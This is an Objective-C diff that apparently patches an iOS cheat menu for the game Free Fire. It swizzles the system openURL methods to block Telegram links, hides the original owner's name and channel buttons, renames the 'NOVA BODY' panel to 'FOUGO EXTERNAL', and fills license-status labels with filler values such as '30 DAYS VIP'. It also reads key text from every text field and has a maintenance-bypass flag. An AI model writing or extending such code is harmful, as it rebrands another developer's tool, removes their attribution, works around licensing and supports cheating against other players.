+        static NSString*FougoSafeStr(id val,NSString*fb){if(!val||val==[NSNull null])return fb?:@"";if([val isKindOfClass:[NSString class]]){NSString*s=(NSString*)val;return s.length>0?s:(fb?:@"");}if([val respondsToSelector:@selector(stringValue)])return [val stringValue]?:(fb?:@"");return fb?:@"";}
+        static NSString*FougoCleanKey(NSString*raw){if(!raw||![raw isKindOfClass:[NSString class]])return @"";NSMutableCharacterSet*cs=[WS_SET mutableCopy];[cs addCharactersInString:@"`'\"\u200B\u200C\u200D\uFEFF"];return [raw stringByTrimmingCharactersInSet:cs];}
+        static BOOL FougoLooksLikeGeneratedKey(NSString*uKey){if(!uKey||uKey.length<8)return NO;if([uKey hasPrefix:@"FOUGO-"]||[uKey hasPrefix:@"NOVA-"]||[uKey hasPrefix:@"VIP-"])return uKey.length>=10;NSArray<NSString*>*parts=[uKey componentsSeparatedByString:@"-"];if(parts.count>=3&&uKey.length>=11){NSCharacterSet*alnum=[[NSCharacterSet characterSetWithCharactersInString:@"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"] invertedSet];for(NSString*p in parts){if(p.length<2||[p rangeOfCharacterFromSet:alnum].location!=NSNotFound)return NO;}return YES;}return NO;}
+        static char kFougoBtnHookKey;
+        static char kFougoCardStyleKey;
+        @implementation UIApplication(FougoBlockStartupRedirect)+(void)load{Method m1=class_getInstanceMethod(self,@selector(openURL:options:completionHandler:));
+        Method m2=class_getInstanceMethod(self,@selector(fougo_safe_openURL:options:completionHandler:));if(m1&&m2)method_exchangeImplementations(m1,m2);Method m3=class_getInstanceMethod(self,@selector(openURL:));
+        Method m4=class_getInstanceMethod(self,@selector(fougo_safe_openURL:));if(m3&&m4)method_exchangeImplementations(m3,m4);}
+        -(void)fougo_safe_openURL:(NSURL*)url options:(NSDictionary*)options completionHandler:(void(^)(BOOL))completion{
+        NSString*uStr=[[url absoluteString] lowercaseString]?:@"";
+        BOOL isTg=([uStr containsString:@"t.me/"]||[uStr hasPrefix:@"tg://"]);
+        if(!g_DashOn&&isTg&&!g_AllowURL){if(completion)completion(NO);return;}
+        g_AllowURL=NO;[self fougo_safe_openURL:url options:options completionHandler:completion];}
+        -(BOOL)fougo_safe_openURL:(NSURL*)url{
+        NSString*uStr=[[url absoluteString] lowercaseString]?:@"";
+        BOOL isTg=([uStr containsString:@"t.me/"]||[uStr hasPrefix:@"tg://"]);
+        if(!g_DashOn&&isTg&&!g_AllowURL){return NO;}
+        g_AllowURL=NO;return [self fougo_safe_openURL:url];}@end
+        @interface FougoVecIcon:UIView
+        @property(nonatomic,assign)NSInteger iconKind;
+        @property(nonatomic,strong)UIColor*strokeCol;
+        -(instancetype)initWithFrame:(CGRect)f kind:(NSInteger)k;
+        @end
+        @implementation FougoVecIcon{CAShapeLayer*_sl;}
+        -(instancetype)initWithFrame:(CGRect)f kind:(NSInteger)k{self=[super initWithFrame:f];if(self){self.backgroundColor=[UIColor clearColor];self.userInteractionEnabled=NO;_iconKind=k;_strokeCol=[UIColor colorWithWhite:0.92 alpha:0.92];_sl=[CAShapeLayer layer];_sl.fillColor=[UIColor clearColor].CGColor;_sl.strokeColor=_strokeCol.CGColor;_sl.lineWidth=1.75;_sl.lineCap=kCALineCapRound;_sl.lineJoin=kCALineJoinRound;[self.layer addSublayer:_sl];}return self;}
+        -(void)setStrokeCol:(UIColor*)c{_strokeCol=c;_sl.strokeColor=c.CGColor;}
+        -(void)layoutSubviews{[super layoutSubviews];_sl.frame=self.bounds;CGFloat w=self.bounds.size.width,h=self.bounds.size.height;if(w<=0||h<=0)return;UIBezierPath*p=[UIBezierPath bezierPath];
+        if(_iconKind==0){[p moveToPoint:CGPointMake(w*0.14,h*0.46)];[p addLineToPoint:CGPointMake(w*0.50,h*0.14)];[p addLineToPoint:CGPointMake(w*0.86,h*0.46)];[p moveToPoint:CGPointMake(w*0.24,h*0.42)];[p addLineToPoint:CGPointMake(w*0.24,h*0.84)];[p addLineToPoint:CGPointMake(w*0.76,h*0.84)];[p addLineToPoint:CGPointMake(w*0.76,h*0.42)];[p moveToPoint:CGPointMake(w*0.42,h*0.84)];[p addLineToPoint:CGPointMake(w*0.42,h*0.58)];[p addLineToPoint:CGPointMake(w*0.58,h*0.58)];[p addLineToPoint:CGPointMake(w*0.58,h*0.84)];}
+        else if(_iconKind==1){CGFloat r=w*0.08;[p appendPath:[UIBezierPath bezierPathWithRoundedRect:CGRectMake(w*0.14,h*0.14,w*0.31,h*0.31) cornerRadius:r]];[p appendPath:[UIBezierPath bezierPathWithRoundedRect:CGRectMake(w*0.55,h*0.14,w*0.31,h*0.31) cornerRadius:r]];[p appendPath:[UIBezierPath bezierPathWithRoundedRect:CGRectMake(w*0.14,h*0.55,w*0.31,h*0.31) cornerRadius:r]];[p appendPath:[UIBezierPath bezierPathWithRoundedRect:CGRectMake(w*0.55,h*0.55,w*0.31,h*0.31) cornerRadius:r]];}
+        else if(_iconKind==2){CGPoint c=CGPointMake(w*0.5,h*0.5);[p appendPath:[UIBezierPath bezierPathWithArcCenter:c radius:w*0.15 startAngle:0 endAngle:M_PI*2 clockwise:YES]];[p appendPath:[UIBezierPath bezierPathWithArcCenter:c radius:w*0.29 startAngle:0 endAngle:M_PI*2 clockwise:YES]];for(int i=0;i<6;i++){CGFloat a=i*(M_PI/3.0);[p moveToPoint:CGPointMake(c.x+cos(a)*w*0.29,c.y+sin(a)*h*0.29)];[p addLineToPoint:CGPointMake(c.x+cos(a)*w*0.41,c.y+sin(a)*h*0.41)];}}
+        _sl.path=p.CGPath;}
+        @end
+        @interface FougoFloatingBottomBar:UIView
+        @property(nonatomic,assign)NSInteger activeIdx;
+        @property(nonatomic,copy)void(^onSelectTab)(NSInteger idx);
+        -(void)setActiveIdx:(NSInteger)idx animated:(BOOL)anim;
+        @end
+        @implementation FougoFloatingBottomBar{UIVisualEffectView*_bv;CAGradientLayer*_topSheen;UIView*_pill;NSMutableArray<UIView*>*_slots;NSMutableArray<FougoVecIcon*>*_icons;NSMutableArray<UILabel*>*_lbs;}
+        -(instancetype)initWithFrame:(CGRect)f{self=[super initWithFrame:f];if(self){self.backgroundColor=[UIColor clearColor];self.clipsToBounds=NO;_activeIdx=1;self.layer.zPosition=999.0;
+        self.layer.shadowColor=[UIColor blackColor].CGColor;self.layer.shadowOffset=CGSizeMake(0,10);self.layer.shadowRadius=22.0;self.layer.shadowOpacity=0.50;
+        _bv=[[UIVisualEffectView alloc] initWithEffect:[UIBlurEffect effectWithStyle:UIBlurEffectStyleSystemChromeMaterialDark]];_bv.frame=self.bounds;_bv.autoresizingMask=UIViewAutoresizingFlexibleWidth|UIViewAutoresizingFlexibleHeight;_bv.layer.cornerRadius=31.0;_bv.layer.masksToBounds=YES;_bv.layer.borderWidth=1.0;_bv.layer.borderColor=[UIColor colorWithWhite:1.0 alpha:0.22].CGColor;_bv.userInteractionEnabled=NO;[self addSubview:_bv];
+        _topSheen=[CAGradientLayer layer];_topSheen.colors=@[(id)[UIColor colorWithWhite:1.0 alpha:0.16].CGColor,(id)[UIColor colorWithWhite:1.0 alpha:0.02].CGColor,(id)[UIColor colorWithWhite:1.0 alpha:0.0].CGColor];_topSheen.locations=@[@0.0,@0.5,@1.0];_topSheen.startPoint=CGPointMake(0.5,0.0);_topSheen.endPoint=CGPointMake(0.5,1.0);[_bv.contentView.layer addSublayer:_topSheen];
+        _pill=[[UIView alloc] init];_pill.backgroundColor=[UIColor colorWithRed:0.35 green:0.84 blue:1.0 alpha:0.18];_pill.layer.borderWidth=1.0;_pill.layer.borderColor=[UIColor colorWithRed:0.58 green:0.93 blue:1.0 alpha:0.48].CGColor;_pill.userInteractionEnabled=NO;[_bv.contentView addSubview:_pill];
+        NSArray*names=@[@"HOME",@"GAMES",@"SETTINGS"];_slots=[NSMutableArray array];_icons=[NSMutableArray array];_lbs=[NSMutableArray array];
+        for(int i=0;i<3;i++){UIView*s=[[UIView alloc] init];s.userInteractionEnabled=NO;[_bv.contentView addSubview:s];[_slots addObject:s];FougoVecIcon*ic=[[FougoVecIcon alloc] initWithFrame:CGRectMake(0,0,20,20) kind:i];[s addSubview:ic];[_icons addObject:ic];UILabel*lb=[[UILabel alloc] init];lb.text=names[i];lb.font=[UIFont systemFontOfSize:10.0 weight:UIFontWeightBold];lb.textAlignment=NSTextAlignmentCenter;[s addSubview:lb];[_lbs addObject:lb];}
+        [self setActiveIdx:1 animated:NO];}return self;}
+        -(void)layoutSubviews{[super layoutSubviews];CGRect b=self.bounds;[CATransaction begin];[CATransaction setDisableActions:YES];_bv.layer.cornerRadius=b.size.height*0.5;_topSheen.frame=b;[CATransaction commit];CGFloat sw=b.size.width/3.0;for(int i=0;i<3;i++){UIView*s=_slots[i];s.frame=CGRectMake(sw*i,0,sw,b.size.height);_icons[i].frame=CGRectMake((sw-20)*0.5,11,20,20);_lbs[i].frame=CGRectMake(2,35,sw-4,14);}
+        CGFloat pw=sw-12.0,ph=b.size.height-10.0;_pill.frame=CGRectMake(sw*_activeIdx+6.0,5.0,pw,ph);_pill.layer.cornerRadius=ph*0.5;}
+        -(void)setActiveIdx:(NSInteger)idx animated:(BOOL)anim{_activeIdx=MAX(0,MIN(2,idx));CGRect b=self.bounds;CGFloat sw=b.size.width/3.0;CGFloat pw=MAX(56.0,sw-12.0),ph=MAX(38.0,b.size.height-10.0);
+        void(^blk)(void)=^{if(b.size.width>0){self->_pill.frame=CGRectMake(sw*self->_activeIdx+6.0,5.0,pw,ph);self->_pill.layer.cornerRadius=ph*0.5;}for(int i=0;i<3;i++){BOOL a=(i==self->_activeIdx);self->_slots[i].transform=a?CGAffineTransformMakeScale(1.04,1.04):CGAffineTransformIdentity;[self->_icons[i] setStrokeCol:a?[UIColor colorWithRed:0.68 green:0.95 blue:1.0 alpha:1.0]:[UIColor colorWithWhite:0.80 alpha:0.60]];self->_lbs[i].textColor=a?[UIColor whiteColor]:[UIColor colorWithWhite:0.80 alpha:0.58];}};
+        if(anim)[UIView animateWithDuration:0.30 delay:0 usingSpringWithDamping:0.80 initialSpringVelocity:0.8 options:UIViewAnimationOptionBeginFromCurrentState|UIViewAnimationOptionAllowUserInteraction animations:blk completion:nil];else blk();}
+        -(void)handlePt:(CGPoint)p ended:(BOOL)end{CGFloat sw=MAX(1.0,self.bounds.size.width/3.0);NSInteger idx=MAX(0,MIN(2,(NSInteger)(p.x/sw)));
+        [UIView animateWithDuration:0.18 delay:0 options:UIViewAnimationOptionBeginFromCurrentState|UIViewAnimationOptionAllowUserInteraction animations:^{self->_pill.transform=end?CGAffineTransformIdentity:CGAffineTransformMakeScale(1.03,0.96);} completion:nil];
+        if(idx!=_activeIdx||end){[self setActiveIdx:idx animated:YES];if(end&&self.onSelectTab)self.onSelectTab(idx);}}
+        -(void)touchesBegan:(NSSet<UITouch*>*)touches withEvent:(UIEvent*)event{[self handlePt:[[touches anyObject] locationInView:self] ended:NO];}
+        -(void)touchesMoved:(NSSet<UITouch*>*)touches withEvent:(UIEvent*)event{[self handlePt:[[touches anyObject] locationInView:self] ended:NO];}
+        -(void)touchesEnded:(NSSet<UITouch*>*)touches withEvent:(UIEvent*)event{[self handlePt:[[touches anyObject] locationInView:self] ended:YES];}
+        -(void)touchesCancelled:(NSSet<UITouch*>*)touches withEvent:(UIEvent*)event{[UIView animateWithDuration:0.22 animations:^{self->_pill.transform=CGAffineTransformIdentity;}];}
+        @end
+        static FougoFloatingBottomBar*g_LiqNav=nil;
+        static void FougoCollectControls(UIView*v,NSMutableArray<UIButton*>*btns,NSMutableArray<UITextField*>*fields,NSMutableArray<UILabel*>*labels){if(!v||v.isHidden||v.alpha<0.05||v==g_MaintV||v==g_LiqNav)return;
+        if([v isKindOfClass:[UIButton class]])[btns addObject:(UIButton*)v];else if([v isKindOfClass:[UITextField class]])[fields addObject:(UITextField*)v];else if([v isKindOfClass:[UILabel class]])[labels addObject:(UILabel*)v];for(UIView*sub in v.subviews){FougoCollectControls(sub,btns,fields,labels);}}
+        static void FougoAllFields(UIView*v,NSMutableArray<UITextField*>*fields){if(!v||v==g_MaintV)return;if([v isKindOfClass:[UITextField class]])[fields addObject:(UITextField*)v];
+        for(UIView*sub in v.subviews){FougoAllFields(sub,fields);}}
+        static void FougoSetStatus(UIView*rv,NSArray<UILabel*>*labels){if(!rv||!g_LicOK)return;@try{NSDictionary<NSString*,NSString*>*rowMap=@{
+        @"PLAN":FougoSafeStr(g_LPlan,@"30 DAYS VIP"),@"EXPIRES":FougoSafeStr(g_LExp,@"ACTIVE"),@"DEVICE LIMIT":FougoSafeStr(g_LDLim,@"1 / 1"),@"REGISTERED":FougoSafeStr(g_DReg,@"YES"),@"DEVICE SLOT":FougoSafeStr(g_DSlot,@"SLOT #1 (ACTIVE)"),@"LAST VALIDATION":FougoSafeStr(g_LVal,@"VERIFIED • LIVE"),
+        @"STATUS":FougoSafeStr(g_LStat,@"ACTIVE")};UIColor*aGrn=[UIColor colorWithRed:0.55 green:0.92 blue:1.0 alpha:1.0];for(UILabel*leftLb in labels){if(!leftLb.superview)continue;
+        NSString*lt=[[leftLb.text?:@"" stringByTrimmingCharactersInSet:WS_SET] uppercaseString];NSString*tVal=rowMap[lt];if(!tVal)continue;
+        CGPoint leftPt=[leftLb.superview convertPoint:leftLb.center toView:rv];if(leftPt.x>rv.bounds.size.width*0.55)continue;UILabel*bRt=nil;CGFloat bDx=99999.0;
+        for(UILabel*cand in labels){if(cand==leftLb||!cand.superview)continue;CGPoint rightPt=[cand.superview convertPoint:cand.center toView:rv];
+        if(rightPt.x>leftPt.x+20.0&&fabs(rightPt.y-leftPt.y)<18.0){CGFloat dx=rightPt.x-leftPt.x;if(dx<bDx){bDx=dx;bRt=cand;}}}if(bRt){if(![bRt.text isEqualToString:tVal]){
+        CGRect oFr=bRt.frame;CGFloat rEdg=CGRectGetMaxX(oFr);bRt.text=tVal;bRt.textAlignment=NSTextAlignmentRight;bRt.adjustsFontSizeToFitWidth=YES;bRt.minimumScaleFactor=0.65;
+        if([lt isEqualToString:@"REGISTERED"]||[lt isEqualToString:@"STATUS"]||[lt isEqualToString:@"PLAN"]){bRt.textColor=aGrn;}[bRt sizeToFit];CGRect nFr=bRt.frame;CGFloat mWid=MAX(oFr.size.width,MIN(nFr.size.width+8.0,rv.bounds.size.width*0.54));
+        bRt.frame=CGRectMake(rEdg-mWid,oFr.origin.y,mWid,MAX(oFr.size.height,nFr.size.height));}}}}@catch(NSException*ex){}}
+        static void FougoAllButtonsRecursive(UIView*v,NSMutableArray<UIButton*>*out){if(!v||v==g_MaintV||v==g_LiqNav)return;if([v isKindOfClass:[UIButton class]])[out addObject:(UIButton*)v];for(UIView*s in v.subviews)FougoAllButtonsRecursive(s,out);}
+        static void FougoAllLabelsRecursive(UIView*v,NSMutableArray<UILabel*>*out){if(!v||v==g_MaintV||v==g_LiqNav)return;if([v isKindOfClass:[UILabel class]])[out addObject:(UILabel*)v];for(UIView*s in v.subviews)FougoAllLabelsRecursive(s,out);}
+        static NSString*FougoBtnFullText(UIButton*b){if(!b)return @"";NSMutableString*ms=[NSMutableString string];NSString*t1=[b titleForState:ST_NORM];if(t1)[ms appendFormat:@"%@ ",t1];NSString*t2=[b attributedTitleForState:ST_NORM].string;if(t2)[ms appendFormat:@"%@ ",t2];for(UIView*sub in b.subviews){if([sub isKindOfClass:[UILabel class]]&&((UILabel*)sub).text)[ms appendFormat:@"%@ ",((UILabel*)sub).text];}if(b.superview&&b.superview.bounds.size.width<150.0&&b.superview.bounds.size.height<=84.0){for(UIView*sib in b.superview.subviews){if([sib isKindOfClass:[UILabel class]]&&((UILabel*)sib).text)[ms appendFormat:@"%@ ",((UILabel*)sib).text];}}return [[ms stringByTrimmingCharactersInSet:WS_SET] uppercaseString];}
+        static BOOL FougoIsInScrollView(UIView*v,UIView*rv){UIView*p=v?v.superview:nil;while(p&&p!=rv){if([p isKindOfClass:[UIScrollView class]])return YES;p=p.superview;}return NO;}
+        static BOOL FougoViewHasProtectedContent(UIView*v){if(!v)return NO;NSMutableArray<UILabel*>*lbs=[NSMutableArray array];FougoAllLabelsRecursive(v,lbs);for(UILabel*l in lbs){NSString*u=[[l.text?:@"" stringByTrimmingCharactersInSet:WS_SET] uppercaseString];if([u isEqualToString:@"PLAN"]||[u isEqualToString:@"EXPIRES"]||[u isEqualToString:@"DEVICE LIMIT"]||[u isEqualToString:@"SELECT GAME"]||[u isEqualToString:@"CONTROL CENTER"]||[u isEqualToString:@"SYSTEM STATUS"]||[u containsString:@"FREE FIRE"]||[u isEqualToString:@"NECK"]||[u isEqualToString:@"BODY"])return YES;}return NO;}
+        static NSInteger FougoBottomNavRole(UIButton*b,UIView*rv){if(!b||!b.superview||!rv)return 0;if(b.bounds.size.height>82.0)return 0;
+        NSString*ft=FougoBtnFullText(b);if([ft containsString:@"CONTINUE"])return 0;
+        if([ft containsString:@"GAME"]&&![ft containsString:@"SELECT"]&&![ft containsString:@"FREE"])return 1;
+        if([ft containsString:@"CONTROL"]&&![ft containsString:@"CENTER"])return 2;
+        if([ft containsString:@"STATUS"]&&![ft containsString:@"SYSTEM"])return 3;
+        return 0;}
+        static void FougoHideOldBottomBarForBtn(UIButton*b,UIView*rv){if(!b)return;b.hidden=YES;b.alpha=0.0;UIView*sup=b.superview;if(sup&&sup!=rv&&![sup isKindOfClass:[UIScrollView class]]&&sup.bounds.size.height<120.0){sup.hidden=YES;sup.alpha=0.0;sup.backgroundColor=[UIColor clearColor];sup.layer.borderWidth=0.0;for(UIView*s in sup.subviews){s.hidden=YES;s.alpha=0.0;}if(sup.superview&&sup.superview!=rv&&![sup.superview isKindOfClass:[UIScrollView class]]&&sup.superview.bounds.size.height<120.0){sup.superview.hidden=YES;sup.superview.alpha=0.0;}}}
+        static void FougoTriggerBtn(UIButton*b,UIView*rv){if(!b)return;UIView*sup=b.superview;UIView*sup2=sup?sup.superview:nil;[UIView performWithoutAnimation:^{if(sup2&&sup2!=rv&&sup2.bounds.size.height<120.0){sup2.hidden=NO;sup2.alpha=1.0;}if(sup&&sup!=rv){sup.hidden=NO;sup.alpha=1.0;}b.hidden=NO;b.alpha=1.0;b.enabled=YES;b.userInteractionEnabled=YES;[b sendActionsForControlEvents:EV_TAP];FougoHideOldBottomBarForBtn(b,rv);}];}
+        static void FougoShowDash(UIView*rv);
+        static void FougoApplyLiquidTheme(UIView*rv,NSArray<UIButton*>*btns,NSArray<UILabel*>*labels){if(!rv)return;@try{
+        [UIView performWithoutAnimation:^{
+        NSMutableArray<UILabel*>*allLbs=[NSMutableArray array];FougoAllLabelsRecursive(rv,allLbs);
+        for(UILabel*lb in allLbs){NSString*t=lb.text?:@"";
+        if([t rangeOfString:@"NOVA" options:NSCaseInsensitiveSearch].location!=NSNotFound){
+        lb.text=[[t stringByReplacingOccurrencesOfString:@"NOVA  BODY" withString:@"FOUGO EXTERNAL"] stringByReplacingOccurrencesOfString:@"NOVA BODY" withString:@"FOUGO EXTERNAL"];t=lb.text;}
+        NSString*ut=[[t stringByTrimmingCharactersInSet:WS_SET] uppercaseString];
+        if([ut isEqualToString:@"SELECT COLOR THEME"]||[ut isEqualToString:@"COLOR THEME"]){if(lb.superview&&lb.superview!=rv&&lb.superview.bounds.size.height<420.0)lb.superview.hidden=YES;continue;}
+        if([ut containsString:@"FAKHERDDIN"]||[ut containsString:@"OFFICIAL OWNER"]||[ut containsString:@"OWNER •"]||[ut containsString:@"@FAKHER"]||[ut containsString:@"TELEGRAM"]||[ut containsString:@"CHANNEL LINK"]||[ut containsString:@"OFFICIAL CHANNEL"]||[ut containsString:@"T.ME/"]||[ut containsString:@"JOIN CHANNEL"]){
+        UIView*box=lb.superview;
+        if([ut containsString:@"TELEGRAM"]||[ut containsString:@"CHANNEL"]){
+        if(box){for(UIView*sib in box.subviews){if(sib!=lb&&sib!=g_LiqNav&&sib.bounds.size.height<115.0&&sib.frame.origin.y>=lb.frame.origin.y-20.0&&sib.frame.origin.y<=CGRectGetMaxY(lb.frame)+85.0&&!FougoViewHasProtectedContent(sib)){sib.hidden=YES;sib.alpha=0.0;sib.userInteractionEnabled=NO;}}}}
+        lb.hidden=YES;lb.alpha=0.0;
+        if(box&&box!=rv&&![box isKindOfClass:[UIScrollView class]]&&box.bounds.size.height<165.0&&!FougoViewHasProtectedContent(box)){box.hidden=YES;box.alpha=0.0;box.userInteractionEnabled=NO;for(UIView*s in box.subviews){s.hidden=YES;s.alpha=0.0;}}
+        continue;}
+        CGFloat r=0,g=0,b=0,a=0;if([lb.textColor getRed:&r green:&g blue:&b alpha:&a]){
+        CGFloat mx=MAX(r,MAX(g,b)),mn=MIN(r,MIN(g,b));
+        if(mx-mn>0.18&&fabs(r-0.45)>0.04){lb.textColor=[UIColor colorWithRed:0.45 green:0.90 blue:1.0 alpha:a];}}}
+        for(UIButton*b in btns){if(!b.superview)continue;
+        CGPoint sPt=[b.superview convertPoint:b.center toView:rv];
+        if(sPt.y<105.0&&sPt.x>rv.bounds.size.width-74.0&&b.bounds.size.width<=46.0&&b.bounds.size.height<=46.0){if(!b.isHidden){b.hidden=YES;b.alpha=0.0;}continue;}}
+        NSMutableArray<UIButton*>*allB=[NSMutableArray array];FougoAllButtonsRecursive(rv,allB);
+        for(UIButton*b in allB){
+        NSString*ft=FougoBtnFullText(b);
+        if([ft containsString:@"TELEGRAM"]||[ft containsString:@"CHANNEL"]||[ft containsString:@"T.ME"]||[ft containsString:@"FAKHERDDIN"]||[ft containsString:@"OFFICIAL OWNER"]){
+        b.hidden=YES;b.alpha=0.0;b.userInteractionEnabled=NO;
+        if(b.superview&&b.superview!=rv&&![b.superview isKindOfClass:[UIScrollView class]]&&b.superview.bounds.size.height<150.0&&!FougoViewHasProtectedContent(b.superview)){b.superview.hidden=YES;b.superview.alpha=0.0;b.superview.userInteractionEnabled=NO;}
+        continue;}
+        NSInteger role=FougoBottomNavRole(b,rv);if(role>0){FougoHideOldBottomBarForBtn(b,rv);}}
+        BOOL hasOwnNav=NO;for(UIView*sv in rv.subviews){if([NSStringFromClass([sv class]) containsString:@"FougoLiquidBottomNav"]){hasOwnNav=YES;break;}}
+        if(!hasOwnNav){
+        if(!g_LiqNav){CGFloat bw=MIN(rv.bounds.size.width-32.0,390.0);g_LiqNav=[[FougoFloatingBottomBar alloc] initWithFrame:CGRectMake((rv.bounds.size.width-bw)*0.5,rv.bounds.size.height-84.0,bw,62.0)];
+        g_LiqNav.autoresizingMask=UIViewAutoresizingFlexibleWidth|UIViewAutoresizingFlexibleTopMargin;}
+        __weak UIView*wRv=rv;
+        g_LiqNav.onSelectTab=^(NSInteger idx){UIView*sRv=wRv;if(!sRv)return;NSMutableArray<UIButton*>*curB=[NSMutableArray array];FougoAllButtonsRecursive(sRv,curB);
+        UIButton*gB=nil,*cB=nil,*sB=nil,*cntB=nil;NSMutableArray<UIButton*>*bList=[NSMutableArray array];
+        for(UIButton*b in curB){if(!b.superview)continue;NSString*ft=FougoBtnFullText(b);if([ft containsString:@"CONTINUE"])cntB=b;
+        NSInteger role=FougoBottomNavRole(b,sRv);if(role==1)gB=b;else if(role==2)cB=b;else if(role==3)sB=b;
+        if(!FougoIsInScrollView(b,sRv)){CGPoint pt=[b.superview convertPoint:b.center toView:sRv];if(pt.y>sRv.bounds.size.height-105.0&&b.bounds.size.height<=78.0&&![ft containsString:@"CONTINUE"])[bList addObject:b];}}
+        if((!gB||!cB||!sB)&&bList.count>=3){
+        [bList sortUsingComparator:^NSComparisonResult(UIButton*b1,UIButton*b2){CGFloat x1=[b1.superview convertPoint:b1.center toView:sRv].x;CGFloat x2=[b2.superview convertPoint:b2.center toView:sRv].x;return x1<x2?NSOrderedAscending:(x1>x2?NSOrderedDescending:NSOrderedSame);}];
+        if(!gB)gB=bList[0];if(!cB)cB=bList[1];if(!sB)sB=bList.lastObject;}
+        if(idx==0){if(cB)FougoTriggerBtn(cB,sRv);else if(cntB)FougoTriggerBtn(cntB,sRv);}
+        else if(idx==1){if(gB)FougoTriggerBtn(gB,sRv);}
+        else if(idx==2){if(sB)FougoTriggerBtn(sB,sRv);}
+        FougoShowDash(sRv);};
+        if(g_LiqNav.superview!=rv)[rv addSubview:g_LiqNav];[rv bringSubviewToFront:g_LiqNav];}
+        }];
+        for(UILabel*lb in labels){NSString*ut=[[lb.text?:@"" stringByTrimmingCharactersInSet:WS_SET] uppercaseString];
+        if([ut isEqualToString:@"SELECT GAME"]){if(g_LiqNav.activeIdx!=1)[g_LiqNav setActiveIdx:1 animated:YES];break;}
+        else if([ut isEqualToString:@"CONTROL CENTER"]){if(g_LiqNav.activeIdx!=0)[g_LiqNav setActiveIdx:0 animated:YES];break;}
+        else if([ut isEqualToString:@"SYSTEM STATUS"]){if(g_LiqNav.activeIdx!=2)[g_LiqNav setActiveIdx:2 animated:YES];break;}}}@catch(NSException*ex){}}
+        static void FougoShowDash(UIView*rv){
+        if(!rv)return;if(g_Win&&g_Win.rootViewController&&[NSStringFromClass([g_Win.rootViewController class]) isEqualToString:@"FougoDashboardViewController"])return;
+        @try{NSMutableArray<UIButton*>*btns=[NSMutableArray array];NSMutableArray<UITextField*>*fields=[NSMutableArray array];NSMutableArray<UILabel*>*labels=[NSMutableArray array];
+        FougoCollectControls(rv,btns,fields,labels);FougoSetStatus(rv,labels);FougoApplyLiquidTheme(rv,btns,labels);}@catch(NSException*ex){}}
+        @interface FougoBridgeAppDelegate:UIResponder<UIApplicationDelegate>@property(nonatomic,strong)UIWindow*window;@property(nonatomic,strong)NSTimer*monitorTimer;@end @implementation FougoBridgeAppDelegate
+        -(UIViewController*)topVC{UIViewController*top=g_Win.rootViewController;while(top.presentedViewController){top=top.presentedViewController;}return top;}
+        -(void)alert:(NSString*)title message:(NSString*)msg{dispatch_async(dispatch_get_main_queue(),^{UIViewController*top=[self topVC];if(!top)return;
+        UIAlertController*ac=[UIAlertController alertControllerWithTitle:FougoSafeStr(title,@"Notice") message:FougoSafeStr(msg,@"") preferredStyle:UIAlertControllerStyleAlert];[ac addAction:[UIAlertAction actionWithTitle:@"OK" style:UIAlertActionStyleDefault handler:nil]];
+        [top presentViewController:ac animated:YES completion:nil];});}-(NSString*)deviceUDID{NSString*v=[[[UIDevice currentDevice] identifierForVendor] UUIDString];return FougoSafeStr(v,@"IOS-ARM64-DEVICE");}
+        -(void)capKey{if(!g_Win)return;NSMutableArray<UITextField*>*aFld=[NSMutableArray array];FougoAllFields(g_Win,aFld);for(UITextField*tf in aFld){
+        NSString*txt=FougoCleanKey(tf.text);if(txt.length>=2){g_Key=txt;}}}-(void)syncMaint{if(!g_Win||!IS_DICT(g_Cloud))return;
+        BOOL maintOn=[g_Cloud[@"maintenance"] respondsToSelector:@selector(boolValue)]?[g_Cloud[@"maintenance"] boolValue]:NO;if(maintOn&&!g_MaintBypass){NSDictionary*mInfo=IS_DICT(g_Cloud[@"maintenance_info"])?g_Cloud[@"maintenance_info"]:@{};
+        NSString*mTitle=FougoSafeStr(mInfo[@"title"],@"SYSTEM MAINTENANCE");NSString*mDesc=FougoSafeStr(mInfo[@"description"],@"We are currently performing scheduled maintenance. Please check back soon.");
+        NSString*mRet=FougoSafeStr(mInfo[@"return_time"],@"Soon");NSString*mBtn=FougoSafeStr(mInfo[@"button"],@"Join Telegram Channel");if(!g_MaintV){g_MaintV=[[UIView alloc] initWithFrame:g_Win.bounds];
+        g_MaintV.backgroundColor=RGBA(0.04,0.06,0.10,0.98);g_MaintV.autoresizingMask=UIViewAutoresizingFlexibleWidth|UIViewAutoresizingFlexibleHeight;UIView*card=[[UIView alloc] initWithFrame:CGRectMake(24,(g_Win.bounds.size.height-340)/2.0,g_Win.bounds.size.width-48,340)];
+        card.backgroundColor=RGBA(0.08,0.11,0.18,0.95);card.layer.cornerRadius=22.0;card.layer.borderWidth=1.2;card.layer.borderColor=RGBA(0.0,0.95,0.83,0.45).CGColor;
+        card.tag=7001;[g_MaintV addSubview:card];UILabel*iconLb=[[UILabel alloc] initWithFrame:CGRectMake(0,22,card.bounds.size.width,46)];iconLb.text=@"🛠";
+        iconLb.font=[UIFont systemFontOfSize:40];iconLb.textAlignment=NSTextAlignmentCenter;[card addSubview:iconLb];UILabel*titleLb=[[UILabel alloc] initWithFrame:CGRectMake(16,76,card.bounds.size.width-32,30)];
+        titleLb.font=[UIFont boldSystemFontOfSize:20];titleLb.textColor=[UIColor whiteColor];titleLb.textAlignment=NSTextAlignmentCenter;titleLb.tag=7002;[card addSubview:titleLb];
+        UILabel*descLb=[[UILabel alloc] initWithFrame:CGRectMake(20,112,card.bounds.size.width-40,72)];descLb.font=[UIFont systemFontOfSize:14];descLb.textColor=[UIColor colorWithWhite:0.78 alpha:1.0];
+        descLb.textAlignment=NSTextAlignmentCenter;descLb.numberOfLines=4;descLb.tag=7003;[card addSubview:descLb];UILabel*retLb=[[UILabel alloc] initWithFrame:CGRectMake(20,190,card.bounds.size.width-40,24)];
+        retLb.font=[UIFont boldSystemFontOfSize:12];retLb.textColor=RGBA(0.0,0.95,0.83,1.0);retLb.textAlignment=NSTextAlignmentCenter;retLb.tag=7004;[card addSubview:retLb];
+        UIButton*actBtn=[UIButton buttonWithType:UIButtonTypeSystem];actBtn.frame=CGRectMake(24,228,card.bounds.size.width-48,44);actBtn.backgroundColor=RGBA(0.0,0.78,0.68,1.0);
+        [actBtn setTitleColor:[UIColor blackColor] forState:ST_NORM];actBtn.titleLabel.font=[UIFont boldSystemFontOfSize:14];actBtn.layer.cornerRadius=12.0;actBtn.tag=7005;
+        [actBtn addTarget:self action:@selector(onMaintTap:)forControlEvents:EV_TAP];[card addSubview:actBtn];UIButton*ownerBtn=[UIButton buttonWithType:UIButtonTypeSystem];
